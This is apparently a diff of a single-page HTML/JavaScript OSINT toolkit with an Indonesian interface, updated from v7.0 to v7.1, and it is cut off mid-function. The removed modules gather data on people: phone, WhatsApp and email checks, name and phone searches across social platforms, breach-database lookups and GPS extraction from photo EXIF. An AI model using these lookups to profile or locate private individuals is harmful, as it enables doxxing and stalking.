@@ -3,30 +3,28 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>M4zk1pL4y ToolS v7.0 — 100+ Tools Fullstack OSINT Suite</title>
+<title>M4zk1pL4y ToolS v7.1 — 100+ Tools Fullstack OSINT Suite</title>
 <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/jszip@3.10.1/dist/jszip.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/marked@12.0.0/marked.min.js"></script>
 <style>
 :root{--bg:#050505;--acc:#00ff41;--acc2:#ff2d55;--acc3:#00d4ff;--acc4:#ffd400;--dim:#777;--brd:1px solid #1a3a1a}
 *{margin:0;padding:0;box-sizing:border-box}
 html,body{background:var(--bg);color:#d8ffd8;font-family:monospace;overflow-x:hidden;width:100%}
 ::selection{background:var(--acc);color:#000}
-#bgphoto{position:fixed;inset:0;z-index:0;background:url('file_000000000fa48211b2c09fa64b21f357.png') center/cover no-repeat;opacity:.30;filter:grayscale(50%) contrast(120%)}
+#bgphoto{position:fixed;inset:0;z-index:0;background:url('file_000000000fa48211b2c09fa64b21f357.png') center/cover no-repeat;opacity:.30;filter:grayscale(50%)}
 #bgshade{position:fixed;inset:0;z-index:1;background:linear-gradient(180deg,rgba(5,5,5,.86),rgba(5,5,5,.94))}
-#matrix{position:fixed;inset:0;z-index:2;opacity:.05;pointer-events:none}
 @keyframes glitch{0%,91%,100%{transform:none}92%{transform:translate(2px,-1px) skewX(3deg)}94%{transform:translate(-2px,1px)}96%{transform:translate(1px,2px)}}
 #splash{position:fixed;inset:0;z-index:100;display:flex;align-items:center;justify-content:center;overflow:hidden}
 #bgvideo{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;filter:brightness(.4)}
 .spl-shade{position:absolute;inset:0;background:radial-gradient(ellipse,rgba(0,0,0,.3),rgba(0,0,0,.9))}
-.spl-box{position:relative;z-index:2;width:min(92vw,660px);max-height:86dvh;overflow-y:auto;background:rgba(3,8,3,.95);border:2px solid var(--acc);padding:22px;box-shadow:0 0 40px rgba(0,255,65,.3)}
+.spl-box{position:relative;z-index:2;width:min(92vw,660px);max-height:86dvh;overflow-y:auto;background:rgba(3,8,3,.95);border:2px solid var(--acc);padding:22px}
 .spl-box h1{font-size:clamp(15px,4vw,22px);letter-spacing:2px;animation:glitch 4s infinite;margin-bottom:12px}
 .spl-box h1 b{color:var(--acc)}.spl-box h1 span{color:var(--acc2)}
 .spl-box .warn{color:var(--acc2);font-weight:bold;margin-bottom:8px}
 .spl-box ul{margin:8px 0 8px 18px;line-height:1.7;font-size:12px;color:#bfe8bf}
 .btn{cursor:pointer;border:1px solid var(--acc);background:transparent;color:var(--acc);font-family:inherit;font-weight:bold;padding:11px 18px;letter-spacing:1px;transition:.15s;font-size:13px}
-.btn:hover{background:var(--acc);color:#000;box-shadow:0 0 16px rgba(0,255,65,.5)}
+.btn:hover{background:var(--acc);color:#000}
 .btn.red{border-color:var(--acc2);color:var(--acc2)}.btn.red:hover{background:var(--acc2);color:#000}
 .btn.sm{padding:7px 12px;font-size:11px}
 #app{display:none;position:relative;z-index:3;min-height:100dvh}
@@ -34,20 +32,18 @@ header{background:rgba(0,0,0,.88);border-bottom:2px solid var(--acc);padding:10p
 .logo{font-size:clamp(12px,3.4vw,19px);letter-spacing:2px;font-weight:bold;animation:glitch 4s infinite;cursor:pointer;white-space:nowrap}
 .logo b{color:var(--acc)}.logo span{color:var(--acc2)}
 #search{flex:1;min-width:140px;background:#0a0a0a;border:1px solid var(--brd);color:#d8ffd8;font-family:inherit;padding:9px 12px;font-size:13px}
-#search:focus{outline:none;border-color:var(--acc)}
 .stat{font-size:11px;color:var(--dim);white-space:nowrap}.stat b{color:var(--acc)}
 #net{font-size:10px;padding:3px 7px;border:1px solid var(--dim)}
 #net.on{color:var(--acc);border-color:var(--acc)}#net.off{color:var(--acc2);border-color:var(--acc2)}
-nav{display:flex;gap:5px;padding:9px 12px;flex-wrap:wrap;position:sticky;z-index:29;background:rgba(5,5,5,.92);border-bottom:var(--brd);backdrop-filter:blur(6px)}
-nav .tab{cursor:pointer;padding:7px 12px;font-size:11px;border:1px solid #1a3a1a;color:var(--dim);transition:.15s;white-space:nowrap}
-nav .tab:hover{color:var(--acc)}nav .tab.act{color:#000;background:var(--acc);font-weight:bold}
+nav{display:flex;gap:5px;padding:9px 12px;flex-wrap:wrap;position:sticky;z-index:29;background:rgba(5,5,5,.92);border-bottom:var(--brd)}
+nav .tab{cursor:pointer;padding:7px 12px;font-size:11px;border:1px solid #1a3a1a;color:var(--dim);white-space:nowrap}
+nav .tab.act{color:#000;background:var(--acc);font-weight:bold}
 main{padding:12px;max-width:1300px;margin:0 auto;width:100%}
 .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:10px}
 .card{background:rgba(11,11,11,.92);border:1px solid #1a3a1a;padding:14px;cursor:pointer;transition:.15s}
 .card:hover{border-color:var(--acc);box-shadow:0 0 14px rgba(0,255,65,.25);transform:translateY(-2px)}
 .card h3{color:var(--acc);font-size:13px;margin-bottom:5px;word-break:break-word}
 .card p{font-size:10.5px;color:var(--dim);line-height:1.5}
-.card .tag{display:inline-block;margin-top:7px;font-size:9.5px;color:var(--acc4);border:1px solid #3a3a1a;padding:1px 7px}
 #modal{position:fixed;inset:0;z-index:60;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,.85)}
 #modal.open{display:flex}
 .mbox{background:#0a0a0a;border:2px solid var(--acc);width:min(95vw,900px);max-height:92dvh;display:flex;flex-direction:column}
@@ -55,39 +51,36 @@ main{padding:12px;max-width:1300px;margin:0 auto;width:100%}
 .mhead h2{font-size:14px;color:var(--acc);word-break:break-word}
 .mbody{padding:14px;overflow-y:auto;flex:1}
 label{display:block;font-size:11px;color:var(--acc3);margin:8px 0 3px}
-input,textarea,select{width:100%;background:#050505;border:1px solid var(--brd);color:#d8ffd8;font-family:inherit;padding:9px;font-size:13px}
+input,textarea{width:100%;background:#050505;border:1px solid var(--brd);color:#d8ffd8;font-family:inherit;padding:9px;font-size:13px}
 textarea{min-height:110px;resize:vertical}
-input:focus,textarea:focus,select:focus{outline:none;border-color:var(--acc)}
 .out{margin-top:10px;background:#020202;border:1px solid var(--brd);padding:11px;font-size:12px;white-space:pre-wrap;word-break:break-word;max-height:44dvh;overflow-y:auto}
 .obar{display:flex;gap:6px;margin-top:8px;flex-wrap:wrap}
 #toast{position:fixed;bottom:16px;right:16px;z-index:300;display:flex;flex-direction:column;gap:7px;max-width:88vw}
-.toast{background:#0a0a0a;border:1px solid var(--acc);color:var(--acc);padding:9px 14px;font-size:12px;animation:tin .3s}
+.toast{background:#0a0a0a;border:1px solid var(--acc);color:var(--acc);padding:9px 14px;font-size:12px}
 .toast.err{border-color:var(--acc2);color:var(--acc2)}
-@keyframes tin{from{transform:translateX(30px);opacity:0}to{transform:none;opacity:1}}
 footer{padding:14px;text-align:center;font-size:10.5px;color:var(--dim);border-top:var(--brd)}
 footer b{color:var(--acc)}
 @media(max-width:600px){.grid{grid-template-columns:1fr 1fr}}
 </style>
 </head>
 <body>
-<div id="bgphoto"></div><div id="bgshade"></div><canvas id="matrix"></canvas>
+<div id="bgphoto"></div><div id="bgshade"></div>
 
 <div id="splash">
   <video id="bgvideo" autoplay muted loop playsinline><source src="lv_7587046372008889605_20260826104017.mp4" type="video/mp4"></video>
   <div class="spl-shade"></div>
   <div class="spl-box">
-    <h1>M4ZK1PL4Y <b>TOOL</b><span>S</span> v7.0</h1>
+    <h1>M4ZK1PL4Y <b>TOOL</b><span>S</span> v7.1</h1>
     <p class="warn">⚠ DISCLAIMER &amp; PERSETUJUAN ⚠</p>
     <ul>
-      <li>Gunakan <b>HANYA</b> pada sistem/aset yang Anda miliki atau punya <b>izin tertulis</b> untuk diuji.</li>
-      <li>Akses tanpa otorisasi = <b>ILEGAL</b> (UU ITE &amp; hukum siber). Developer tidak bertanggung jawab atas penyalahgunaan.</li>
-      <li>Modul <b>OSINT orang</b> hanya untuk <b>verifikasi diri sendiri / due-diligence resmi / kasus yang Anda punya kewenangan hukum</b> — <b>dilarang</b> untuk stalking, doxxing, penipuan, atau mengambil data pribadi orang lain (KTP/KK/alamat/password milik orang lain).</li>
-      <li>Semua hasil tercatat lokal di browser Anda.</li>
+      <li>Gunakan <b>HANYA</b> pada aset yang Anda miliki / izin tertulis. Akses tanpa otorisasi = <b>ILEGAL</b> (UU ITE).</li>
+      <li>Modul OSINT orang: hanya verifikasi diri sendiri / due-diligence resmi. Dilarang stalking/doxxing data pribadi orang lain.</li>
+      <li>Developer tidak bertanggung jawab atas penyalahgunaan. Aktivitas tercatat lokal di browser Anda.</li>
     </ul>
     <p style="color:var(--dim);font-size:11px">"HACK WITH PERMISSION, NOT WITHOUT"</p>
     <div style="display:flex;gap:10px;margin-top:14px;flex-wrap:wrap">
-      <button class="btn" id="btnAgree">[ ✔ SAYA SETUJU ]</button>
-      <button class="btn red" id="btnDeny">[ ✘ TOLAK ]</button>
+      <button class="btn" onclick="mzkAgree()">[ ✔ SAYA SETUJU ]</button>
+      <button class="btn red" onclick="mzkDeny()">[ ✘ TOLAK ]</button>
     </div>
   </div>
 </div>
@@ -95,14 +88,14 @@ footer b{color:var(--acc)}
 <div id="app">
 <header>
   <div class="logo" onclick="openCat('ALL')">M4ZK1PL4Y <b>TOOL</b><span>S</span></div>
-  <input id="search" placeholder="🔍 Cari 100+ tools... (Ctrl+K)">
+  <input id="search" placeholder="🔍 Cari tools... (Ctrl+K)">
   <div class="stat">MODUL <b id="st-mod">0</b></div>
   <div class="stat">RUN <b id="st-scan">0</b></div>
   <div id="net" class="on">[ ONLINE ]</div>
 </header>
 <nav id="nav"></nav>
 <main><div id="grid" class="grid"></div></main>
-<footer>M4ZK1PL4Y TOOL<b>S</b> v7.0 — 100+ MODULES — AUTHORIZED USE ONLY — <span id="clock"></span></footer>
+<footer>M4ZK1PL4Y TOOL<b>S</b> v7.1 — AUTHORIZED USE ONLY — <span id="clock"></span></footer>
 </div>
 
 <div id="modal"><div class="mbox">
@@ -111,1123 +104,636 @@ footer b{color:var(--acc)}
 </div></div>
 <div id="toast"></div>
 
+<!-- ============ BLOCK 1: SPLASH — selalu jalan, mandiri ============ -->
 <script>
-if(localStorage.getItem('mzk_agree_v7')==='1')skipSplash();
-function skipSplash(){const s=document.getElementById('splash');if(s)s.style.display='none';
-  document.getElementById('app').style.display='block';const v=document.getElementById('bgvideo');if(v)v.pause();boot();}
-document.getElementById('btnAgree').onclick=()=>{localStorage.setItem('mzk_agree_v7','1');skipSplash()};
-document.getElementById('btnDeny').onclick=()=>{document.querySelector('.spl-box').innerHTML='<h1>AKSES <b>DITOLAK</b></h1>';setTimeout(()=>location.href='about:blank',1200)};
-
-const cv=document.getElementById('matrix'),ctx=cv.getContext('2d');
-function rs(){cv.width=innerWidth;cv.height=innerHeight}rs();addEventListener('resize',rs);
-const drops=[];setInterval(()=>{ctx.fillStyle='rgba(5,5,5,.08)';ctx.fillRect(0,0,cv.width,cv.height);
-ctx.fillStyle='#00ff41';ctx.font='12px monospace';
-for(let i=0;i<Math.floor(cv.width/14);i++){if(!drops[i])drops[i]=Math.random()*-50;
-ctx.fillText(String.fromCharCode(0x30A0+Math.random()*96),i*14,drops[i]*14);
-drops[i]=drops[i]>cv.height/14?0:drops[i]+1;}},60);
-
-const $=id=>document.getElementById(id);
-function toast(m,e){const t=document.createElement('div');t.className='toast'+(e?' err':'');t.textContent=m;$('toast').appendChild(t);setTimeout(()=>t.remove(),3000)}
-function esc(s){return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))}
-function bump(){const n=(+localStorage.getItem('mzk_run')||0)+1;localStorage.setItem('mzk_run',n);$('st-scan').textContent=n}
-async function cFetch(url){const ps=[u=>fetch(u),u=>fetch('https://api.allorigins.win/raw?url='+encodeURIComponent(u))];
-  for(const f of ps){try{const r=await f(url);if(r)return r}catch(e){}}throw new Error('fetch gagal / CORS')}
-function netU(){const on=navigator.onLine,e=$('net');e.className=on?'on':'off';e.textContent=on?'[ ONLINE ]':'[ OFFLINE ]'}
-setInterval(netU,4000);netU();
-setInterval(()=>{$('clock').textContent=new Date().toLocaleTimeString('id-ID')},1000);
-function ask(l,d){const v=prompt(l,d||'');return v===null?null:v.trim()}
-function dload(n,t){const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([t],{type:'text/plain'}));a.download=n;a.click();toast('[⬇] '+n)}
-function outBox(body,html){
-  body.insertAdjacentHTML('beforeend','<div class="obar"><button class="btn sm" data-a="copy">[⧉ COPY]</button><button class="btn sm" data-a="dl">[⬇ DOWNLOAD]</button></div><div class="out">'+html+'</div>');
-  const box=body.querySelector('.out');
-  body.querySelector('[data-a=copy]').onclick=()=>navigator.clipboard.writeText(box.innerText).then(()=>toast('[✔] Copied'));
-  body.querySelector('[data-a=dl]').onclick=()=>dload('m4zk-result-'+Date.now()+'.txt',box.innerText);
-  return box}
-
-const TOOLS=[];
-function reg(cat,name,desc,tags,run){TOOLS.push({cat,name,desc,tags,run})}
-const O='OSINT',P='RECON',D='DORK',S='SQLI',H='HTTP',U='SUBD',C='CRYPTO',E='ENCODE',W='WEBDEV',K='CODE',A='APK',V='DEVICE',T='LEAK',X='MISC';
-
-/* ================== OSINT SUITE (22 tools) ================= */
-reg(O,'Phone Intel — Full Lookup','Lacak nomor HP: negara, operator, tipe (mobile/landline), validasi E.164 — real-time via API publik',['phone','osint'],
-async(b,o)=>{const ph=ask('Nomor HP (format internasional):','+6281234567890');if(!ph)return;
-try{const d=await(await fetch('https://api.apilayer.com/number_verification/validate?number='+ph,{headers:{apikey:'PASTE_KEY'}})).json().catch(async()=>await(await fetch('https://api.abstractapi.com/v1/phone-validation?api_key=&phone='+ph)).json().catch(()=>null));
-let out='NOMOR: '+ph+'\n\n== VALIDASI LOKAL ==\nE.164: '+(ph.startsWith('+')?ph:'+'+ph)+'\nPanjang: '+ph.length+' digit\nHanya digit: '+ph.replace(/\D/g,'');
-try{const d2=await(await fetch('https://restcountries.com/v3.1/callingcode/'+ph.replace(/\D/g,'').slice(0,2))).json();
-if(Array.isArray(d2)&&d2[0])out+='\n\n== NEGARA (prefix) ==\n'+d2[0].name.common+'\nRegion: '+(d2[0].region||'')}catch{}
-out+='\n\n== CARRIER & TYPE (real-time API) ==\n';
-out+=d?(JSON.stringify(d,null,2)):'API publik gratis butuh key. Solusi real-time no-key:\n→ https://www.google.com/search?q=%22'+encodeURIComponent(ph)+'%22\n→ https://sync.me/search/?number='+encodeURIComponent(ph)+' (free web)\n→ https://truecaller.com/search/intl/'+encodeURIComponent(ph)+' (web)\n→ https://phoneinfoga.crvxlabs.net/ (tool OS, install: go install github.com/sundowndev/phoneinfoga@latest)\n\nPerintah lokal:\nphoneinfoga scan -n "'+ph+'"';
-outBox(b,out)}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-
-reg(O,'WhatsApp Checker','Deteksi apakah nomor terdaftar WhatsApp — via wa.me redirect (real behavior) + generate wa link',['phone','whatsapp'],
-async(b,o)=>{const ph=ask('Nomor (contoh 6281234567890 tanpa +):','6281234567890');if(!ph)return;
-const num=ph.replace(/\D/g,'');
-outBox(b,`CEK WHATSAPP (metode manual & programmatic):
-
-== METODE 1 — LINK REDIRECT ==
-Buka link di bawah; jika muncul profile/chat → NOMOR ADA DI WHATSAPP:
-→ https://wa.me/${num}
-→ https://api.whatsapp.com/send?phone=${num}
-
-== METODE 2 — api (dev) ==
-WhatsApp Business API / Baileys (self-host):
-  const exists = await sock.onWhatsApp('${num}')
-  → hasil: [{exists:true, jid:'${num}@s.whatsapp.net'}]
-
-== METODE 3 — WHATSAPP WEB SCANNER (lokal) ==
-whatsapp-web.js / Baileys:
-  npm i whatsapp-web.js
-  const client = new Client(); client.initialize();
-  const r = await client.isRegisteredUser('${num}@c.us')
-  → hasil true = terdaftar
-
-== TIPS ==
-- wa.me link di browser mobile: redirect WA app = terdaftar
-- Landing "phone number shared via link" = tidak terdaftar
-- Gunakan juga: https://wa.me/${num}?text= untuk uji link pratinjau`);bump()});
-
-reg(O,'Email Intel — Full Recon','Validasi email + MX + disposable check + gravatar + breach link — semua real-time',['email','osint'],
-async(b,o)=>{const em=ask('Email:','test@example.com');if(!em)return;
-const dom=em.split('@')[1];let out='EMAIL: '+em+'\n\n';
-try{const d=await(await fetch('https://dns.google/resolve?name='+dom+'&type=MX')).json();
-out+='== MX RECORD ==\n'+(d.Answer?d.Answer.map(a=>a.data).join('\n'):'✘ TIDAK ADA MX → email invalid/tidak bisa terima')+'\n\n';
-const spf=await(await fetch('https://dns.google/resolve?name='+dom+'&type=TXT')).json();
-const spfRec=(spf.Answer||[]).filter(a=>a.data.includes('spf'));
-out+='== SPF (anti-spoof) ==\n'+(spfRec.length?spfRec.map(a=>a.data).join('\n'):'✘ tidak ada SPF → spoofable!')+'\n\n';
-const dmarc=await(await fetch('https://dns.google/resolve?name=_dmarc.'+dom+'&type=TXT')).json();
-out+='== DMARC ==\n'+(dmarc.Answer?dmarc.Answer[0].data:'✘ tidak ada DMARC')}catch{}
-out+='\n\n== LINK CEK MANUAL (real-time) ==\n'
-+'→ Breach : https://haveibeenpwned.com/account/'+em+'\n'
-+'→ Gravatar : https://gravatar.com/'+CryptoJS.MD5(em.trim().toLowerCase())+'\n'
-+'→ Google : https://www.google.com/search?q=%22'+encodeURIComponent(em)+'%22\n'
-+'→ Holehe (local): holehe '+em+'  (pip install holehe — cek 120+ site registrasi)';
-outBox(b,out);bump()});
-
-reg(O,'Email Existence Checker','Verifikasi email benar-benar ada (SMTP-level via API gratis)',['email'],
-async(b,o)=>{const em=ask('Email:','');if(!em)return;
-try{const r=await fetch('https://api.eva.pingutil.com/email/'+encodeURIComponent(em));
-const d=await r.json();outBox(b,JSON.stringify(d,null,2)+'\n\nCek manual juga:\n→ https://tools.emailhippo.com/\n→ https://hunter.io/email-verifier/'+em)}catch(e){outBox(b,'Fallback manual:\n→ https://tools.emailhippo.com/\n→ https://verifalia.com/free-email-validator\nERR: '+e.message)}bump()});
-
-reg(O,'Person OSINT — Name Search','Cari orang via nama di 12 platform publik (link query real)',['osint','person'],
-async(b,o)=>{const fn=ask('Nama depan:','john');const ln=ask('Nama belakang:','doe');if(!fn)return;
-const q=encodeURIComponent(fn+' '+ln);
-const sites=[['Google',`https://www.google.com/search?q=%22${q}%22`],
-['Google (Indonesia)',`https://www.google.co.id/search?q=%22${q}%22`],
-['Facebook',`https://www.facebook.com/search/top?q=${q}`],
-['LinkedIn',`https://www.linkedin.com/search/results/all/?keywords=${q}`],
-['X/Twitter',`https://x.com/search?q=${q}`],
-['Instagram (via google)',`https://www.google.com/search?q=site:instagram.com+%22${q}%22`],
-['TikTok (via google)',`https://www.google.com/search?q=site:tiktok.com+%22${q}%22`],
-['GitHub',`https://github.com/search?q=${q}&type=users`],
-['Pastebin',`https://www.google.com/search?q=site:pastebin.com+%22${q}%22`],
-['LinkedIn (company)',`https://www.google.com/search?q=site:linkedin.com/in+%22${q}%22`],
-['YouTube',`https://www.youtube.com/results?search_query=${q}`],
-['Pinterest',`https://www.google.com/search?q=site:pinterest.com+%22${q}%22`]];
-outBox(b,'OSINT LINKS — '+fn+' '+ln+'\n\n'+sites.map(([n,u])=>'▸ '+n+'\n  '+u).join('\n')+'\n\n⚠ Gunakan untuk due-diligence/verifikasi identitas yang Anda berwenang — BUKAN stalking.')});
-
-reg(O,'Person OSINT — Phone to Social','Kaitkan nomor HP ke akun sosial via link & engine publik',['osint','phone'],
-async(b,o)=>{const ph=ask('Nomor (format internasional, tanpa +):','6281234567890');if(!ph)return;
-const n=ph.replace(/\D/g,'');
-const q=encodeURIComponent('"'+n+'"');
-const links=[
-['Google — nomor full',`https://www.google.com/search?q=%22${n}%22`],
-['Truecaller',`https://www.truecaller.com/search/intl/${n}`],
-['Sync.me',`https://sync.me/search/?number=${n}`],
-['WhatsApp',`https://wa.me/${n}`],
-['Telegram (t.me)',`https://t.me/${n.slice(-9)}`],
-['Signal (via WA)',`https://wa.me/${n}`],
-['Facebook search',`https://www.facebook.com/search/top?q=${n}`],
-['Instagram via google',`https://www.google.com/search?q=site:instagram.com+%22${n}%22`],
-['LinkedIn via google',`https://www.google.com/search?q=site:linkedin.com+%22${n}%22`],
-['Pastebin',`https://www.google.com/search?q=site:pastebin.com+%22${n}%22`],
-['HaveIBeenPwned (phone)',`https://haveibeenpwned.com/account/${n}`],
-['Whoscall web',`https://www.whoscall.com/en/whocall/${n}`]];
-outBox(b,'PHONE OSINT — +'+n+'\n\n'+links.map(([t,u])=>'▸ '+t+'\n  '+u).join('\n')+'\n\n⚠ Hanya untuk verifikasi kontak Anda/klien yang Anda wakili.')});
-
-reg(O,'Social Media Handle Finder','Cek username di 20+ platform — link checker real',['osint','social'],
-async(b,o)=>{const h=ask('Username/handle:','johndoe');if(!h)return;
-const plats=[['GitHub','https://github.com/'],['Twitter/X','https://x.com/'],['Instagram','https://instagram.com/'],
-['Facebook','https://facebook.com/'],['TikTok','https://tiktok.com/@'],['YouTube','https://youtube.com/@'],
-['Reddit','https://reddit.com/user/'],['LinkedIn','https://linkedin.com/in/'],['Pinterest','https://pinterest.com/'],
-['Medium','https://medium.com/@'],['Dev.to','https://dev.to/'],['Stack Overflow','https://stackoverflow.com/users/'],
-['GitLab','https://gitlab.com/'],['Telegram','https://t.me/'],['Discord (google)',`https://www.google.com/search?q=site:discord.com+%22${h}%22`],
-['Spotify','https://open.spotify.com/user/'],['SoundCloud','https://soundcloud.com/'],['Behance','https://behance.net/'],
-['Dribbble','https://dribbble.com/'],['Vimeo','https://vimeo.com/'],['Tumblr','https://tumblr.com/'],['Blogspot','https://'+h+'.blogspot.com'],
-['Pastebin','https://pastebin.com/u/'],['Keybase','https://keybase.io/']];
-outBox(b,'HANDLE: '+h+'\n\n'+plats.map(([n,u])=>'▸ '+n.padEnd(12)+' '+u+h).join('\n')+'\n\n💡 Automate dengan maigret/sherlock (local):\n  pipx install maigret\n  maigret '+h+' --all\n  sherlock '+h)});
-
-reg(O,'Email to Social Mapper','Kaitkan email ke akun sosial via breach & platform lookup',['osint','email'],
-async(b,o)=>{const em=ask('Email:','');if(!em)return;
-const q=encodeURIComponent('"'+em+'"');
-outBox(b,`EMAIL: ${em}
-
-== PLATFORM LOOKUP ==
-▸ Facebook   https://www.facebook.com/search/top?q=${q}
-▸ Google     https://www.google.com/search?q=${q}
-▸ LinkedIn   https://www.google.com/search?q=site:linkedin.com+%22${q}%22
-▸ Twitter    https://www.google.com/search?q=site:x.com+%22${q}%22
-▸ Instagram  https://www.google.com/search?q=site:instagram.com+%22${q}%22
-▸ GitHub     https://github.com/search?q=${em}&type=users
-▸ HaveIBeenPwned https://haveibeenpwned.com/account/${em}
-▸ Gravatar   https://gravatar.com/${CryptoJS.MD5(em.trim().toLowerCase())}
-▸ LeakCheck  https://leakcheck.io (manual)
-▸ Dehashed   https://dehashed.com/search?query=${em}
-▸ IntelligenceX  https://intelx.io/?s=${em}
-
-== LOCAL TOOLS (lebih kuat) ==
-holehe ${em}   → cek 120+ site registrasi
-theHarvester -d domain -b all
-h8mail -t ${em} -sk HIBP_API_KEY`)});
-
-reg(O,'Credential Leak Search','Cari email/username di breach database publik (real-time API gratis)',['leak','credential'],
-async(b,o)=>{const em=ask('Email/username:','');if(!em)return;
-let out='';
-try{const r=await fetch('https://api.pwnedpasswords.com/range/'+CryptoJS.SHA1(em).toString().toUpperCase().slice(0,5));
-out+='[INFO] HIBP password-range OK. Untuk account breach butuh key.\n'}catch{}
-out+=`== LINK CEK BREACH REAL-TIME ==
-▸ HIBP (web)      https://haveibeenpwned.com/account/${em}
-▸ Firefox Monitor https://monitor.firefox.com/search?email=${em}
-▸ LeakCheck       https://leakcheck.io/search/${em}
-▸ DeHashed        https://dehashed.com/search?query=${em}
-▸ IntelligenceX   https://intelx.io/?s=${em}
-▸ Snusbase        https://snusbase.com (paid)
-▸ BreachDirectory https://breachdirectory.org
-
-== LOCAL CLI (lebih rinci) ==
-h8mail -t ${em} --hibp-key=KEY
-theHarvester -d domain -b all
-pwnedOrNot ${em}
-✔ Cek juga kombinasi: first.last@domain, f.last@domain (permutator)`;
-outBox(b,out);bump()});
-
-reg(O,'Image Reverse Search','Cari sumber gambar di 6 engine (link + upload)',['osint','image'],
-async(b,o)=>{outBox(b,`IMAGE REVERSE SEARCH LINKS:
-▸ Google Lens   https://lens.google.com/upload
-▸ Yandex        https://yandex.com/images/search
-▸ Bing Visual   https://www.bing.com/visualsearch
-▸ TinEye        https://tineye.com/
-▸ Bing (cn)     https://cn.bing.com/images/search?q=
-▸ Baidu         https://graph.baidu.com/pcpage/index?tpl_from=pc
-
-💡 Lokasi dari foto EXIF (local tool):
-  exiftool image.jpg          → GPS/lokasi, device, timestamp
-  exiftool -gps:all image.jpg → koordinat GPS lengkap`)});
-
-reg(O,'EXIF / Metadata Extractor','Baca metadata foto/video: lokasi GPS, device, software (upload file)',['osint','metadata'],
-async(b,o)=>{const inp=document.createElement('input');inp.type='file';inp.accept='image/*,video/*';
-inp.onchange=async()=>{const f=inp.files[0];if(!f)return;
-let out='FILE: '+f.name+'\nSize: '+(f.size/1024).toFixed(1)+' KB\nType: '+f.type+'\nModified: '+new Date(f.lastModified).toLocaleString('id-ID')+'\n';
-try{if(f.type.startsWith('image')){const img=new Image();img.src=URL.createObjectURL(f);await img.decode();
-out+='Dimensi: '+img.naturalWidth+'x'+img.naturalHeight+'\n';}
-const buf=await f.slice(0,65536).arrayBuffer();const bytes=new Uint8Array(buf);
-let str='';for(const b of bytes)str+=String.fromCharCode(b);
-const gps=[...str.matchAll(/([\d]{1,3}\.?\d{0,6}),\s*([0-9]{1,3}\.?\d{0,6})/g)].slice(0,3);
-if(gps.length){out+='\n⚠ KOORDINAT TERDETEKSI:\n';gps.forEach(m=>out+='  → https://maps.google.com/?q='+m[1]+','+m[2]+'\n')}
-if(str.includes('GPS'))out+='\n⚠ EXIF GPS block ditemukan (baca detail pakai exiftool)\n';
+function mzkAgree(){
+  try{localStorage.setItem('mzk_agree_v7','1')}catch(e){}
+  var s=document.getElementById('splash');if(s)s.style.display='none';
+  var v=document.getElementById('bgvideo');if(v){try{v.pause()}catch(e){}}
+  document.getElementById('app').style.display='block';
+  if(window.mzkBoot)window.mzkBoot();
+}
+function mzkDeny(){document.querySelector('.spl-box').innerHTML='<h1>AKSES <b style="color:#ff2d55">DITOLAK</b></h1>';setTimeout(function(){window.close();location.href='about:blank'},1200);}
+try{
+  var _ls=localStorage.getItem('mzk_agree_v7');
+  if(location.search.indexOf('reset=1')>-1){localStorage.removeItem('mzk_agree_v7');}
+  else if(_ls==='1'){mzkAgree();}
 }catch(e){}
-out+='\nUntuk EXIF penuh (local):\n  exiftool file.jpg\n  exiftool -a -u -g1 file.jpg\n\n⚠ Foto dari HP sering membawa GPS koordinat persis.';
+</script>
+
+<!-- ============ BLOCK 2: APP CORE + TOOLS ============ -->
+<script>
+try{(function(){
+var $=function(id){return document.getElementById(id)};
+function esc(s){return String(s).replace(/[&<>"']/g,function(c){return{'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]})}
+function toast(m,e){var t=document.createElement('div');t.className='toast'+(e?' err':'');t.textContent=m;$('toast').appendChild(t);setTimeout(function(){t.remove()},3000)}
+function bump(){try{var n=(+localStorage.getItem('mzk_run')||0)+1;localStorage.setItem('mzk_run',n);$('st-scan').textContent=n}catch(e){}}
+function dload(n,t){var a=document.createElement('a');a.href=URL.createObjectURL(new Blob([t],{type:'text/plain'}));a.download=n;a.click();toast('[⬇] '+n)}
+function ask(l,d){var v=prompt(l,d||'');return v===null?null:v.trim()}
+async function cFetch(url){
+  try{var r=await fetch(url);if(r)return r}catch(e){}
+  try{r=await fetch('https://api.allorigins.win/raw?url='+encodeURIComponent(url));if(r)return r}catch(e){}
+  throw new Error('fetch gagal / diblokir CORS')}
+function outBox(body,html){
+  body.insertAdjacentHTML('beforeend','<div class="obar"><button class="btn sm" data-a="copy">[⧉ COPY]</button><button class="btn sm" data-a="dl">[⬇ DOWNLOAD]</button></div><div class="out"></div>');
+  var box=body.querySelector('.out');
+  if(html!==undefined)box.innerHTML=html;
+  body.querySelector('[data-a=copy]').onclick=function(){navigator.clipboard.writeText(box.innerText).then(function(){toast('[✔] Copied')})};
+  body.querySelector('[data-a=dl]').onclick=function(){dload('m4zk-result-'+Date.now()+'.txt',box.innerText)};
+  return box}
+function glink(q){return 'https://www.google.com/search?q='+encodeURIComponent(q)}
+function netU(){var on=navigator.onLine,e=$('net');e.className=on?'on':'off';e.textContent=on?'[ ONLINE ]':'[ OFFLINE ]'}
+setInterval(netU,4000);
+setInterval(function(){var c=$('clock');if(c)c.textContent=new Date().toLocaleTimeString('id-ID')},1000);
+
+var TOOLS=[];
+function reg(cat,name,desc,tags,run){TOOLS.push({cat:cat,name:name,desc:desc,tags:tags||[],run:run})}
+var O='OSINT',P='RECON',D='DORK',S='SQLI',H='HTTP',U='SUBD',C='CRYPTO',E='ENCODE',K='CODE',A='APK',V='DEVICE',T='LEAK',X='MISC';
+
+/* ================= OSINT (20) ================= */
+reg(O,'Device & IP Fingerprint Saya','Deteksi HP/OS/browser, jaringan, IP publik + ISP + lokasi — real-time',['device','ip'],
+async function(b,o){var u=navigator.userAgent;
